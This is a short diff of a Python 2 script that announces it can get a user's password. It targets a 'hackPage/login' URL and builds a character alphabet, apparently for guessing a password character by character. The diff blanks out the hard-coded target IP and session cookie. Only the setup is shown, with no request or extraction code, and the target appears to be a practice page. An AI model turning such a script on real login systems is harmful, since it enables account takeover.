@@ -14,9 +14,9 @@ print("I can get your password. Take a look!")
 input_id=""
 input_id = raw_input("ID : ")
 
-url = "http://168.188.123.214/hackPage/login"
+url = "http:///hackPage/login"
 
-cookies = dict(PHPSESSID="cbb5tf07eo06i9391t3ht6o145")   
+cookies = dict(PHPSESSID="")   
 special_strings = "~!@#$%^&*()+-_{}[]<>"
 alpha = string.ascii_letters+string.digits+special_strings
 result = ""
